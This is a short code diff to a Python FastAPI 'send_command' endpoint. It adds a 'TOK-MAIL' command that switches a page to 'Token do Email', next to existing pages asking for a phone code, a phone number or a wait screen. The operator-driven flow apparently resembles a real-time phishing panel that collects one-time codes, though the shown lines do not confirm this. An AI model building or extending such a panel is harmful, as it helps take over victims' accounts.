@@ -198,6 +198,8 @@ async def send_command(command: CommandRequest, token_data: dict = Depends(verif
         update_data["page"] = "Código do Telefone"
     elif command.command == "TELEFONE":
         update_data["page"] = "Digitar Telefone"
+    elif command.command == "TOK-MAIL":
+        update_data["page"] = "Token do Email"
     elif command.command == "AGUARDE":
         update_data["page"] = "Aguarde..."
     
